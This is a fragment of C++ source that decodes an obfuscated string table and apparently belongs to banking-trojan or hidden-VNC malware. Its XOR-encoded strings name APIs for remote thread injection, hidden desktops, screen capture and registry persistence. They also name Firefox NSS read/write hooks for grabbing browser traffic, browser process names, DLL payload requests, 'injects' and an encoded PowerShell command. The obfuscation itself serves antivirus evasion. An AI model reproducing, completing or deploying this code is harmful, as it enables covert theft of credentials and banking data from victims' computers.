   Strs::isXdigit                  = UnEnc("\x0038\x003B\x004B\x0030\x003B\x0024\x0020\x0030", "QH3TRCID", 8);
   Strs::strTod                    = UnEnc("\x0040\x0045\x0035\x0044\x0037\x0025", "31G0XA", 6);

   Strs::createToolhelp32Snapshot  = UnEnc("\x000F\x0020\x0023\x0031\x0021\x0051\x0063\x0035\x005F\x0025\x002B\x0054\x0027\x0048\x0075\x007D\x0016\x003E\x0051\x0023\x0047\x0031\x0057\x0038", "LRFPU47Z0IC1K8FOEP0S4Y8L", 24);
   Strs::process32First            = UnEnc("\x0006\x0022\x0025\x0036\x0030\x003B\x0047\x0001\x0066\x0008\x003D\x0022\x0035\x0033", "VPJUUH42TNTPFG", 14);
   Strs::process32Next             = UnEnc("\x0013\x003E\x0057\x0053\x0034\x0025\x0022\x0069\x0003\x0005\x005D\x0028\x002C", "CL80QVQZ1K8PX", 13);
   Strs::strChrA                   = UnEnc("\x0062\x004D\x0037\x0005\x003F\x0026\x0075", "19EFWT4", 7);
   Strs::strToIntA                 = UnEnc("\x0067\x0031\x0027\x001A\x002A\x001A\x0020\x003F\x0009", "4EUNESNKH", 9);
   Strs::getModuleHandleA          = UnEnc("\x0071\x0035\x002E\x0007\x0058\x002A\x003A\x0039\x0020\x0001\x002F\x005A\x0051\x0035\x005D\x0017", "6PZJ7NOUEIN45Y8V", 16);
   Strs::getFileVersionInfoSizeA   = UnEnc("\x0001\x0030\x0030\x0074\x0039\x0025\x0052\x0060\x002E\x003F\x0044\x0058\x003A\x0038\x0071\x0026\x0021\x003C\x0067\x005C\x0030\x0023\x001B", "FUD2PI76KM71UV8HGS45JFZ", 23);
   Strs::getFileVersionInfoA       = UnEnc("\x0008\x0033\x0020\x0004\x0026\x002A\x005C\x006E\x0035\x0025\x0041\x0050\x0057\x0025\x001B\x005F\x003F\x003C\x0073", "OVTBOF98PW298KR1YS2", 19);
   Strs::verQueryValueA            = UnEnc("\x006E\x0033\x0022\x0009\x0034\x0036\x0038\x003F\x000F\x002F\x0058\x0031\x0028\x0000", "8VPXASJFYN4DMA", 14);
   Strs::getModuleInformation      = UnEnc("\x0073\x003C\x003C\x007B\x0028\x0037\x0045\x0020\x002B\x001A\x002B\x0054\x0038\x004B\x005A\x003B\x0044\x002F\x0022\x003F", "4YH6GS0LNSE2W97Z0FMQ", 20);
   Strs::memcmp                    = UnEnc("\x002A\x0020\x0054\x0054\x003E\x0023", "GE97SS", 6);

   Strs::expandEnvironmentStringsA      = UnEnc("\x0000\x0041\x003C\x0037\x0038\x0037\x0015\x0057\x0032\x003F\x0039\x005A\x003C\x0054\x0027\x0039\x003D\x0065\x0027\x003B\x005F\x0024\x002E\x004B\x0016", "E9LVVSP9DVK5R9BWI6SI6JI8W", 25);
   Strs::getPrivateProfileSectionNamesA = UnEnc("\x001E\x0055\x0041\x0063\x0042\x0033\x003C\x002F\x002D\x002A\x0060\x0033\x005E\x0050\x003E\x0021\x003D\x0066\x0029\x002C\x0040\x0030\x0021\x0021\x001A\x0054\x002E\x002A\x0038\x0017", "Y0530ZJNYO0A16WMX5LO4YNOT5COKV", 30);
   Strs::getPrivateProfileStringA       = UnEnc("\x0073\x0054\x0039\x0069\x0045\x0058\x0022\x0027\x003A\x0053\x0011\x0021\x005C\x0033\x0025\x003B\x0034\x006A\x0042\x0047\x0023\x0020\x0050\x0015", "41M971TFN6AS3ULWQ965JN7T", 24);
   Strs::createFileA                    = UnEnc("\x0072\x0033\x002B\x0033\x003E\x0051\x0011\x005D\x0028\x0026\x0014", "1ANRJ4W4DCU", 11);
   Strs::readFile                       = UnEnc("\x006B\x003C\x0053\x005D\x0072\x005B\x003E\x0036", "9Y2942RS", 8);
   Strs::writeFile                      = UnEnc("\x0018\x003D\x0024\x0041\x0057\x0002\x005E\x003C\x0026", "OOM52D7PC", 9);
   Strs::regSetValueExA                 = UnEnc("\x0001\x002A\x002A\x0002\x0056\x0046\x001E\x0057\x0023\x0036\x0053\x0011\x0033\x0007", "SOMQ32H6OC6TKF", 14);
   Strs::regOpenKeyExA                  = UnEnc("\x001D\x0055\x0026\x0003\x0047\x003C\x002F\x0008\x0021\x0048\x0070\x002C\x0007", "O0AL7YACD15TF", 13);
   Strs::regCloseKey                    = UnEnc("\x001D\x0023\x0032\x000C\x0020\x003F\x0027\x0028\x0012\x003F\x003D", "OFUOLPTMYZD", 11);
   Strs::getFileSize                    = UnEnc("\x0000\x0053\x0021\x0005\x0039\x005C\x0033\x006B\x002D\x0033\x005D", "G6UCP0V8DI8", 11);
   Strs::resumeThread                   = UnEnc("\x0017\x0057\x0041\x0034\x005D\x0026\x0005\x0023\x0027\x0030\x002B\x0033", "E22A0CQKUUJW", 12);
   Strs::isWow64Process                 = UnEnc("\x007B\x0042\x0063\x0036\x0022\x0073\x0005\x0063\x0028\x002E\x0055\x0020\x0031\x0037", "214YUE13ZA6EBD", 14);
   Strs::getNativeSystemInfo            = UnEnc("\x0070\x0032\x003A\x0009\x0056\x0024\x005F\x0027\x0024\x0061\x002F\x003F\x002D\x0034\x005B\x0007\x0028\x0035\x0059", "7WNG7P6QA2VLYQ6NFS6", 19);
   Strs::openProcess                    = UnEnc("\x0005\x0042\x0029\x0038\x0013\x0033\x005B\x002E\x0035\x003A\x0037", "J2LVCA4MPID", 11);
   Strs::createThread                   = UnEnc("\x0076\x002A\x005D\x0039\x0032\x0056\x0063\x0027\x002A\x0056\x0051\x0028", "5X8XF37OX30L", 12);
   Strs::getUserNameW                   = UnEnc("\x0076\x0027\x0037\x001F\x0022\x002E\x0044\x0003\x0054\x0022\x002D\x0066", "1BCJQK6M5OH1", 12);
   Strs::getComputerNameW               = UnEnc("\x000C\x0032\x0035\x000F\x0028\x002E\x0034\x0024\x003D\x0053\x0045\x0076\x002C\x002C\x0029\x0014", "KWALGCDQI678MALC", 16);
   Strs::getVersionExA                  = UnEnc("\x0016\x0055\x0041\x0015\x0031\x0023\x0027\x003D\x0056\x005F\x000A\x003B\x0015", "Q05CTQTT91OCT", 13);
   Strs::createNamedPipeA               = UnEnc("\x0075\x003B\x0037\x0031\x003C\x0028\x001A\x0052\x003A\x002C\x0032\x0060\x0023\x0034\x0051\x0004", "6IRPHMT3WIV0JD4E", 16);
   Strs::connectNamedPipe               = UnEnc("\x0007\x0059\x003E\x0057\x0051\x0056\x0031\x001D\x0024\x0024\x0051\x0027\x0002\x0025\x003F\x003C", "D6P945ESEI4CRLOY", 16);
   Strs::disconnectNamedPipe            = UnEnc("\x0005\x005E\x003E\x003A\x003E\x003D\x0028\x003D\x0052\x003E\x007D\x0032\x0027\x0028\x002E\x001E\x0033\x003F\x0053", "A7MYQSFX1J3SJMJNZO6", 19);
   Strs::internetCrackUrlA              = UnEnc("\x007D\x0056\x0030\x003C\x0033\x002A\x005D\x003F\x007A\x0021\x0030\x002F\x0027\x0066\x0045\x0036\x000C", "48DYAD8K9SQLL37ZM", 17);
   Strs::getTempPathA                   = UnEnc("\x0077\x0022\x002D\x0002\x0054\x005C\x0038\x0006\x0022\x0023\x0021\x0073", "0GYV11HVCWI2", 12);
   Strs::getTempFileNameA               = UnEnc("\x007F\x0034\x003A\x0017\x002A\x0039\x002A\x0071\x0023\x0021\x0030\x001C\x0029\x002B\x0023\x000D", "8QNCOTZ7JMURHFFL", 16);
   Strs::shellExecuteA                  = UnEnc("\x0064\x003B\x003F\x0021\x003B\x0072\x002F\x0036\x0039\x0039\x0030\x002D\x0074", "7SZMW7WSZLDH5", 13);
   Strs::ioctlsocket                    = UnEnc("\x002A\x0057\x0031\x002E\x003F\x0031\x002D\x0027\x0022\x0053\x003E", "C8RZSBBDI6J", 11);
   Strs::ntohs                          = UnEnc("\x0026\x0046\x002B\x0027\x0024", "H2DOW", 5);
   Strs::createMutexA                   = UnEnc("\x0004\x003C\x0033\x0036\x0041\x003C\x0018\x0043\x0041\x0022\x0039\x0072", "GNVW5YU65GA3", 12);
   Strs::releaseMutex                   = UnEnc("\x0066\x0028\x0028\x0034\x0033\x0031\x0022\x0002\x0036\x0046\x003F\x003D", "4MDQRBGOC2ZE", 12);
   Strs::waitForSingleObject            = UnEnc("\x0012\x0029\x0030\x0022\x0016\x0029\x0046\x0067\x0020\x0058\x0034\x005B\x0036\x0019\x0023\x0025\x002A\x0036\x0047", "EHYVPF44I6S7SVAOOU3", 19);
   Strs::enumWindows                    = UnEnc("\x0008\x002F\x003D\x0024\x0061\x005B\x005D\x0054\x005F\x0041\x004A", "MAHI6230069", 11);
   Strs::getCurrentProcessId            = UnEnc("\x0013\x002A\x002C\x0012\x0027\x002B\x004B\x005D\x003C\x0044\x001C\x0035\x0039\x005B\x0051\x0035\x0044\x007F\x0026", "TOXQRY98R0LGV84F76B", 19);
   Strs::deleteFileA                    = UnEnc("\x0075\x0024\x003E\x005C\x003A\x0020\x0070\x0050\x005E\x0056\x0017", "1AR9NE6923V", 11);
   Strs::pathFileExistsA                = UnEnc("\x0000\x0025\x0043\x0021\x000B\x002C\x0027\x0027\x0001\x0034\x0026\x0023\x0030\x0030\x0000", "PD7IMEKBDLOPDCA", 15);
   Strs::createDirectoryA               = UnEnc("\x0070\x0025\x002E\x0022\x0023\x0050\x0077\x0030\x0034\x005C\x0020\x003B\x0024\x003F\x002F\x001B", "3WKCW53YF9COKMVZ", 16);
   Strs::httpQueryInfoA                 = UnEnc("\x0000\x0032\x0042\x003C\x0018\x003F\x0028\x0024\x0023\x007C\x0058\x0055\x0035\x000C", "HF6LIJMVZ563ZM", 14);
   Strs::httpQueryInfoW                 = UnEnc("\x001D\x003B\x0043\x003D\x001A\x003E\x003C\x0042\x003E\x0013\x0038\x0036\x005D\x001E", "UO7MKKY0GZVP2I", 14);
   Strs::rtlCompressBuffer              = UnEnc("\x0019\x002E\x0055\x0019\x003C\x003A\x0038\x0039\x0022\x0043\x0041\x0017\x003F\x003F\x002B\x0055\x004B", "KZ9ZSWHKG02UJYM09", 17);
   Strs::rtlGetCompressionWorkSpaceSize = UnEnc("\x0013\x004C\x005E\x0017\x003D\x0026\x007B\x002D\x0026\x0031\x0023\x005D\x0034\x0043\x005B\x003E\x002A\x001B\x0056\x0044\x0023\x0018\x0034\x0027\x0029\x002D\x0014\x003C\x0020\x0024", "A82PXR8BKAQ8G02QDL96HKDFJHGUZA", 30);
   Strs::setThreadDesktop               = UnEnc("\x006A\x002B\x0024\x0064\x003E\x0023\x005C\x0052\x0033\x000D\x0024\x002B\x0023\x0022\x005F\x003C", "9NP0VQ93WIAXHV0L", 16);
   Strs::createDesktopA                 = UnEnc("\x007A\x0033\x005C\x0025\x0033\x002B\x0009\x0051\x0041\x0031\x0041\x0037\x0036\x0010", "9A9DGNM42Z5XFQ", 14);
   Strs::openDesktopA                   = UnEnc("\x0003\x003E\x0028\x0025\x0005\x0021\x0027\x003A\x0032\x0022\x0022\x000B", "LNMKADTQFMRJ", 12);
   Strs::terminateThread                = UnEnc("\x000D\x0054\x0047\x0039\x002D\x003C\x002E\x004C\x002D\x0013\x003D\x0024\x0051\x0036\x0025", "Y15TDRO8HGUV4WA", 15);
   Strs::postMessageA                   = UnEnc("\x0005\x0057\x0046\x0022\x0000\x003C\x0034\x0044\x0039\x002B\x0053\x0017", "U85VMYG7XL6V", 12);
   Strs::sendMessageA                   = UnEnc("\x000B\x0057\x003D\x0051\x0015\x0032\x0045\x002A\x0037\x005F\x002C\x0017", "X2S5XW6YV8IV", 12);
   Strs::childWindowFromPoint           = UnEnc("\x000D\x0021\x002E\x0025\x0021\x0064\x0059\x003F\x002B\x002C\x004F\x0015\x0038\x005E\x0028\x0006\x003D\x005D\x0027\x003D", "NIGIE30QOC8SJ1EVR4II", 20);
   Strs::screenToClient                 = UnEnc("\x001B\x0055\x0043\x0022\x003F\x0025\x0063\x0057\x0074\x005B\x0039\x0032\x0034\x003E", "H61GZK7877PWZJ", 14);
   Strs::moveWindow                     = UnEnc("\x0005\x002A\x0024\x005D\x0065\x005D\x0038\x0035\x0028\x0022", "HER824VQGU", 10);
   Strs::getWindowRect                  = UnEnc("\x0074\x0024\x0022\x0061\x003B\x0022\x002C\x005E\x0047\x0013\x002A\x0031\x0025", "3AV6RLH10AORQ", 13);
   Strs::getMenuItemID                  = UnEnc("\x0006\x0031\x0047\x0078\x0054\x003D\x0024\x0011\x0039\x0057\x002C\x001D\x0005", "AT351SQXM2ATA", 13);
   Strs::menuItemFromPoint              = UnEnc("\x0009\x0031\x002C\x003A\x0011\x0044\x003F\x002A\x000B\x002B\x0035\x002F\x0002\x0038\x0059\x0036\x0042", "DTBOX0ZGMYZBRW0X6", 17);
   Strs::realGetWindowClassA            = UnEnc("\x0008\x0051\x0051\x0034\x0016\x0035\x004C\x006F\x005A\x0059\x0054\x0058\x0025\x000B\x003A\x002C\x0021\x003B\x0018", "Z40XQP883707RHVMRHY", 19);
   Strs::ptInRect                       = UnEnc("\x000A\x0038\x0004\x0037\x0063\x002F\x003B\x0040", "ZLMY1JX4", 8);
   Strs::getWindowPlacement             = UnEnc("\x0002\x0051\x003F\x0061\x0059\x0057\x0034\x002B\x0031\x0063\x0021\x0039\x0027\x0021\x003C\x0056\x005D\x004D", "E4K609PDF3MXDDQ339", 18);
   Strs::setWindowLongA                 = UnEnc("\x0019\x0050\x0026\x0012\x0030\x0057\x002B\x002C\x004F\x0019\x0022\x0029\x005F\x000E", "J5REY9OC8UMG8O", 14);
   Strs::getWindowLongA                 = UnEnc("\x0074\x0033\x0047\x0012\x003D\x002F\x005D\x0057\x0035\x0008\x003F\x003A\x0022\x0014", "3V3ETA98BDPTEU", 14);
   Strs::windowFromPoint                = UnEnc("\x0002\x003F\x005B\x0030\x005B\x0045\x0007\x0040\x0022\x002C\x0016\x0024\x003B\x0037\x0035", "UV5T42A2MAFKRYA", 15);
   Strs::shAppBarMessage                = UnEnc("\x0066\x0078\x0079\x0044\x0048\x0071\x0032\x0038\x0001\x002E\x0041\x004A\x002A\x0053\x002A", "508483SJLK29K4O", 15);
   Strs::regQueryValueExA               = UnEnc("\x000B\x0023\x0052\x0065\x0027\x0028\x0028\x004A\x001A\x0026\x0022\x0037\x002F\x0076\x0040\x0008", "YF54RMZ3LGNBJ38I", 16);
   Strs::getDesktopWindow               = UnEnc("\x0013\x0029\x0043\x0003\x002B\x0022\x0031\x0033\x005F\x0033\x001B\x003D\x0027\x0027\x005D\x0047", "TL7GNQZG0CLTIC20", 16);
   Strs::deleteDc                       = UnEnc("\x0073\x005D\x0021\x0024\x0024\x0032\x0003\x001A", "78MAPWGY", 8);
   Strs::releaseDc                      = UnEnc("\x0014\x0052\x0034\x003D\x0034\x0041\x002C\x0015\x000E", "F7XXU2IQM", 9);
   Strs::deleteObject                   = UnEnc("\x0006\x002F\x0035\x002B\x002D\x0024\x0007\x0033\x0033\x0020\x0033\x0035", "BJYNYAHQYEPA", 12);
   Strs::getDiBits                      = UnEnc("\x0001\x0030\x003E\x000B\x0011\x0006\x0022\x0025\x004B", "FUJOXDKQ8", 9);
   Strs::stretchBlt                     = UnEnc("\x0060\x0042\x0034\x002F\x0035\x0032\x005B\x0000\x003B\x0043", "36FJAQ3BW7", 10);
   Strs::setStretchBltMode              = UnEnc("\x0060\x0050\x0033\x001B\x0047\x0037\x0028\x003E\x0054\x002D\x0016\x005D\x0027\x007D\x0037\x005D\x0028", "35GH3EMJ7ET1S0X9M", 17);
   Strs::selectObject                   = UnEnc("\x001C\x002F\x005B\x003F\x005B\x004D\x0000\x002B\x0024\x0036\x0026\x002C", "OJ7Z89OINSEX", 12);
   Strs::createCompatibleDc             = UnEnc("\x0016\x003D\x002A\x0022\x0033\x0032\x0005\x0056\x0023\x0020\x002B\x003F\x005A\x002C\x0021\x0035\x0007\x000D", "UOOCGWF9NPJK3NMPCN", 18);
   Strs::createCompatibleBitmap         = UnEnc("\x000C\x0024\x0024\x0025\x0024\x0054\x001A\x0026\x0058\x0045\x0053\x004D\x0038\x0034\x0025\x0032\x000F\x0059\x0032\x0034\x002D\x0034", "OVADP1YI5529QVIWM0FYLD", 22);
   Strs::getDc                          = UnEnc("\x0014\x0024\x004D\x007C\x0002", "SA98A", 5);
   Strs::isWindowVisible                = UnEnc("\x001E\x0046\x0002\x0031\x0057\x0022\x0056\x0033\x0005\x003E\x0021\x0050\x003A\x0022\x005D", "W5UX9F9DSWR9XN8", 15);
   Strs::getWindow                      = UnEnc("\x0076\x002E\x0033\x0019\x0050\x0037\x0026\x0027\x0036", "1KGN9YBHA", 9);
   Strs::printWindow                    = UnEnc("\x0006\x0038\x0027\x002C\x003F\x0013\x0028\x002A\x0035\x005E\x0034", "VJNBKDADQ1C", 11);
   Strs::getTopWindow                   = UnEnc("\x000A\x002E\x003C\x0067\x005C\x0021\x0005\x0059\x0057\x0051\x005E\x0025", "MKH33QR0951R", 12);

   Strs::rtlInitAnsiString            = UnEnc("\x001E\x003A\x0021\x0001\x005D\x003F\x004D\x000D\x003B\x002A\x003C\x0010\x002E\x0040\x005E\x005D\x0037", "LNMH3V9LUYUCZ273P", 17);           
   Strs::rtlAnsiStringToUnicodeString = UnEnc("\x0005\x003A\x003F\x0074\x0022\x0025\x0038\x0010\x003A\x0027\x003A\x0029\x002B\x001D\x002A\x0066\x005C\x002A\x003A\x0057\x0051\x0022\x0000\x0026\x0022\x003B\x0037\x0057", "WNS5LVQCNUSGLIE32CY85GSRPRY0", 28);     
   Strs::ldrLoadDll                   = UnEnc("\x000A\x0021\x0033\x001F\x0036\x002A\x0029\x0017\x0026\x003B", "FEASYKMSJW", 10);
   Strs::ldrGetProcedureAddress       = UnEnc("\x000D\x0055\x0044\x0002\x0034\x0036\x0001\x0034\x0025\x0032\x0035\x002D\x0042\x0042\x002F\x0075\x0030\x0035\x0046\x0027\x0023\x0040", "A16EQBQFJQPI70J4TQ4BP3", 22);
   Strs::rtlFreeUnicodeString         = UnEnc("\x0065\x0044\x005B\x000C\x0026\x005C\x0037\x0014\x005B\x003F\x0036\x0029\x0026\x0053\x0010\x0044\x0042\x003B\x002F\x002C", "707JT9RA5VUFB6C00RAK", 20);
   Strs::rtlCreateUserThread          = UnEnc("\x001A\x003C\x0020\x0075\x0035\x002E\x002B\x0047\x0054\x0063\x002B\x002D\x0035\x0013\x005B\x0034\x002D\x0026\x0036", "HHL6GKJ316XHGG3FHGR", 19);


  // Strs::helloWorld        = UnEnc("\x0019\x003D\x0026\x0039\x005C\x0079\x0066\x0036\x003C\x005E\x0057", "QXJU3Y1YN23", 11);
 //  Strs::exeExt            = UnEnc("\x001E\x002B\x003A\x0023", "0NBF", 4);
 //  Strs::fileDiv           = UnEnc("\x000A", "V", 1);

 //  Strs::postSpace         = UnEnc("\x000A\x001F\x0011\x0017\x0069", "ZPBCI", 5);
 //  Strs::getSpace          = UnEnc("\x0077\x001C\x001E\x0019", "0YJ9", 4);
 //  Strs::httpReq1          = UnEnc("\x0017\x0006\x006C\x0061\x0013\x0019\x0065\x007A\x0008\x0059\x005D", "7N85C6TT9TW", 11);
 //  Strs::httpReq2          = UnEnc("\x0070\x0037\x0021\x003D\x006A\x0077", "8XRIPW", 6);
 //  Strs::httpReq3          = UnEnc("\x003B\x004B\x0068\x0034\x002A\x0020\x002F\x0034\x007E\x0010\x0028\x002A\x0064\x0053\x0058\x005A\x003E\x0053\x0046\x0038\x0071\x0024\x0058\x003E\x002D\x0021\x0026\x0079\x0023\x003A\x0047\x0056\x0062\x0077\x0040\x003D\x0034\x0047\x0077\x0020\x0043\x0026\x0054\x004B\x0044\x0013\x005F\x005D\x0039\x005D\x0021\x0022\x005E\x0038\x005D\x006C\x0065\x003A\x0054\x0059\x002A\x0037\x0035\x0048", "6A8FKGBUD0FEI099V6K22K6JHORTWC73XW4XL3XH7K8FNP03W8BV7W3VEY86YR8B", 64);
 //  Strs::httpReq4          = UnEnc("\x0070\x0022\x003C\x0023\x0050\x0023\x002D\x001C\x0005\x0021\x005B\x0034\x0038\x0059\x000F\x0011", "3MRW5MY1ID5SL151", 16);
 //  Strs::httpReq5          = UnEnc("\x0010\x000D\x0062\x0008\x006E\x007C\x001B\x0070\x0012\x007B\x0063\x0067\x0015\x007E\x0018", "XY6XAM5A2ISW51S", 15);
 //  Strs::httpReq6          = UnEnc("\x006A\x006D", "PM", 2);
//   Strs::httpReq7          = UnEnc("\x0074\x0022\x002C\x004C\x0020\x0059\x003F\x0066\x0007\x0028\x005D\x0057\x0038\x0023", "7MB8E7KKKM30LK", 14);
 //  Strs::httpReq8          = UnEnc("\x001A\x0040\x0026\x0027\x004A\x0030\x002E\x0033\x007C\x0014\x003F\x0057\x0038\x0057\x002B\x0058\x0036", "N2GI9VKAQQQ4W3B6Q", 17);
 //  Strs::httpReq9          = UnEnc("\x0036\x0038\x0032\x0020\x0024\x0051\x0057", "UPGNO43", 7);
//   Strs::sprintfIntEscape  = UnEnc("\x0076\x0054", "S0", 2);
 //  Strs::winNewLine        = UnEnc("\x005A\x0044", "WN", 2);

   Strs::ntRegPath         = UnEnc("\x006C\x0013\x0026\x002D\x003B\x004B\x0032\x0041\x0020\x000F\x0001\x0047\x0026\x0045\x006A\x0070\x0021\x0017\x006E\x0021", "0ACJR8F3YST4C76URKKR", 20);
 //  Strs::userRunKey        = UnEnc("\x001A\x0021\x0053\x003D\x003B\x0024\x0044\x005D\x0064\x0000\x0059\x002A\x004B\x0059\x0039\x003E\x0029\x0033\x0011\x000E\x0031\x0026\x002C\x0057\x0035\x0025\x0019\x0013\x0026\x0038\x003E\x002C\x003E\x0031\x0013\x0028\x0037\x0040\x0051\x0022\x002C\x0014\x0067\x0039\x005C", "IN5ILE688M0I96JQOGMYXHH8BVEPSJLIPEEME38MBH5L2", 45);

   Strs::dllhostExe         = UnEnc("\x002F\x0059\x002A\x0031\x003F\x0034\x0038\x0019\x0032\x004B\x0024", "K5FYPGL7W3A", 11);
   Strs::pingRequest        = UnEnc("\x0036\x005E\x0026\x0057", "F7H0", 4);
   Strs::dll32binRequest    = UnEnc("\x0023\x0038\x003E\x0026\x002B\x003C\x0047\x0007\x0003", "AQPZBR341", 9);
   Strs::dll64binRequest    = UnEnc("\x0054\x0025\x0038\x0034\x0050\x0039\x0025\x007B\x0002", "6LVH9WQM6", 9);
   Strs::explorerExe        = UnEnc("\x0023\x0049\x002A\x0055\x005E\x0031\x0021\x0033\x0065\x0057\x0034\x0020", "F1Z91CDAK2LE", 12);
   Strs::firefoxExe         = UnEnc("\x0021\x002E\x0024\x002C\x002B\x0039\x004A\x0068\x002E\x0033\x0034", "GGVIMV2FKKQ", 11);
   Strs::chromeExe          = UnEnc("\x0021\x0026\x0043\x002A\x0038\x0021\x0019\x0024\x0036\x003D", "BN1EUD7ANX", 10);
   Strs::iexploreExe        = UnEnc("\x0023\x0057\x0028\x0031\x002E\x0035\x003F\x0032\x006F\x002D\x0039\x0036", "J2PABZMWAHAS", 12);
   Strs::powershell         = UnEnc("\x0028\x0035\x0031\x005C\x004B\x002B\x0029\x003C\x0024\x003A\x0014\x0066\x0037\x0039\x0024\x0040\x003D\x0042\x006D\x001F\x005B\x003E\x005A\x0022\x0026\x0026\x0028\x0016\x0072\x000F\x0029\x002B\x003F\x0020\x0035\x002E\x005D\x0008\x007F\x0071\x004E\x0033\x003F\x003C\x0058\x0032\x003A\x0039\x003D\x003A\x002C\x0065\x0008\x0069\x0064\x0078\x0002\x000A\x0068\x0052\x0022\x002B\x003A\x0037\x0021\x0054\x0069\x007D\x000F\x004F\x0028\x0056\x0055\x002C\x0045\x0021\x005C\x0023\x0036\x002A\x0041\x0015\x0075\x0063\x0062\x0076\x0073\x0069\x006C\x0030\x0025\x0026\x0043\x0022\x005B\x0051\x000C\x0009\x0076\x0024\x003E\x0021\x0033\x003F\x003C\x0032\x0024\x0056\x0024\x0024\x0069\x006E\x006B\x0069\x0055\x003D\x0059\x0034\x0028\x0024\x0031\x000B\x0073\x0074\x002D\x005B\x0026\x0034\x002A\x0040\x0045\x002F\x005C\x0038\x0058\x007B", "XZF99XAYHV4KYVA8T6M28Q7OGHL6PTJDQSZB8UEK9ZQX7EMPYNDE5IUH2131MEIXM14G58A81C2I9JQB55HCQFHI7SJH0M74Q3LFKGUZNEM2PLISK26R7GGHTVINZ2HPE72F8L0Y", 136);
   Strs::edgeExe            = UnEnc("\x0021\x0021\x003C\x0028\x0055\x0035\x001C\x0033\x0033\x0055", "LRYL2P2VK0", 10);
   Strs::braveExe           = UnEnc("\x0055\x004A\x0031\x0027\x0052\x0065\x0032\x003C\x0033", "78PQ7KWDV", 9);
   Strs::injectsRequest     = UnEnc("\x0033\x0059\x002D\x0024\x0036\x0043\x0044", "Z7GAU77", 7);
   Strs::firefoxName        = UnEnc("\x001F\x003A\x0026\x0026\x0033\x0057\x003A", "YSTCU8B", 7);
   Strs::chromeName         = UnEnc("\x000B\x002E\x0022\x003D\x0059\x0035", "HFPR4P", 6);
   Strs::ieName             = UnEnc("\x000C\x005D\x0023\x0026\x004B\x005A\x002C\x004D\x0078\x007C\x002A\x0024\x0058\x005F\x0030\x0054\x0037", "E3WC94I9X9RT40B1E", 17);
   Strs::chromeDll          = UnEnc("\x0031\x002C\x003D\x005B\x005D\x002F\x006D\x002D\x002B\x0055", "RDO40JCIG9", 10);
   Strs::bitBlt             = UnEnc("\x0075\x0021\x003F\x0010\x005E\x0045", "7HKR21", 6);

   Strs::nss3dll  = UnEnc("\x0037\x0022\x0045\x007F\x006A\x0026\x005C\x0035", "YQ6LDB0Y", 8);
   Strs::nspr4dll = UnEnc("\x0056\x0032\x0023\x0030\x0067\x0074\x002D\x002D\x003D", "8ASBSZIAQ", 9);
   Strs::prRead   = UnEnc("\x0012\x006A\x0011\x0002\x0030\x002F\x0030", "B8NPUNT", 7);
   Strs::prWrite  = UnEnc("\x0005\x0066\x006D\x0062\x003E\x0058\x0039\x0036", "U425L1MS", 8);
   Strs::rdata    = UnEnc("\x0074\x0043\x0022\x002B\x0032\x0030", "Z1FJFQ", 6);

 //  Strs::fc1  = UnEnc("\x004C\x005A\x000D\x005F\x0058\x0044\x0054\x002F\x002E\x007F\x007C\x0052\x005F\x002D\x0027\x0027\x0076\x0064", "APN0601AZR071JSOLD", 18);
 //  Strs::fc2  = UnEnc("\x0005\x002E\x0053\x002F\x0039\x0040\x0060\x0002\x0036\x0022\x0022\x0054\x003D\x0057\x0053", "DM0JI4MGXAM0T94", 15);
//   Strs::fc3  = UnEnc("\x0028\x0025\x0036\x002F\x002E\x0030\x002C\x004B", "AASAZYX2", 8);
//   Strs::fc4  = UnEnc("\x0016\x002A\x0022\x0032\x002A\x002F\x0030\x0014\x0007\x0034\x002D\x0020\x0046\x0032", "UELFOAD9KQCG2Z", 14);
 //  Strs::fc5  = UnEnc("\x0065\x003A\x0032\x0020\x0029\x0025\x0055\x002B\x0015\x0072\x005F\x0020\x005F\x002E\x0050\x0021\x0030", "1HSNZC0Y871C0J9OW", 17);
//   Strs::fc6  = UnEnc("\x0013\x003F\x003B\x0029\x0020\x0054\x002E\x0051\x0028\x003B", "PPUGE7Z8GU", 10);
//   Strs::fc7  = UnEnc("\x0021\x002E\x0024\x0021\x0056", "BBKR3", 5);
//   Strs::fc8  = UnEnc("\x004E\x0041\x0009\x0023\x003C\x0038\x005C\x003B\x0036\x001B\x0013\x0037\x003E\x0029\x0070\x0014", "CKJLRL9UB6GNNLJ4", 16);
 //  Strs::fc9  = UnEnc("\x004D\x0050\x004C\x0023\x001F\x0020\x0020\x0035\x0027", "954W0HTXK", 9);
 //  Strs::fc10 = UnEnc("\x003E\x005A\x001F\x003C\x0039\x0036\x002D\x0038\x0057\x0057\x006A\x0061", "3PSSZWYQ89PA", 12);
 //  Strs::fc11 = UnEnc("\x0054\x003D\x0008\x003F\x005A\x0020\x002E\x0056\x0020\x0061\x001B\x0052\x005E\x0025\x0032\x0039\x000E\x0063", "Y7KP4TK8TLW70BFQ4C", 18);
//   Strs::fc12 = UnEnc("\x006D\x001C\x001E\x0027\x0021\x0062\x0039\x0026\x003F\x002E\x0068\x0016\x0065\x0028\x006A\x0071\x003C\x0000\x0064\x0026\x0006\x0031\x0007", "51VBX6QCMKR6PM34L8TH5YJ", 23);
  
 //  Strs::headersEnd = UnEnc("\x0057\x003A\x005E\x0038", "Z0S2", 4);

 //  Strs::bu1 = UnEnc("\x005B\x0038\x007D\x0022\x0073\x0077\x001F\x0048\x0053", "V2XQIW5EY", 9);
 //  Strs::bu2 = UnEnc("\x0075\x0077", "OW", 2);
 //  Strs::bu3 = UnEnc("\x0047\x0044\x0070\x005D\x0034\x0035\x006B\x0077", "JN82GAQW", 8);
 //  Strs::bu4 = UnEnc("\x005D\x003F\x0030\x0045\x0018\x003B\x001F\x0062\x0068\x0067", "5KD50H6XGH", 10);
  // Strs::bu5 = UnEnc("\x003E\x0059\x002B\x003A\x0060\x0046\x0036\x007C\x0040\x0036\x006E\x0031\x0034", "R6LFE5JY3JKUH", 13);

//   Strs::ie1  = UnEnc("\x0016\x001E\x000A\x000E", "FQYZ", 4);
//   Strs::ie2  = UnEnc("\x007A\x0068\x0000\x001D\x0009\x001D\x001D\x0007\x0017", "FIDRJIDWR", 9);
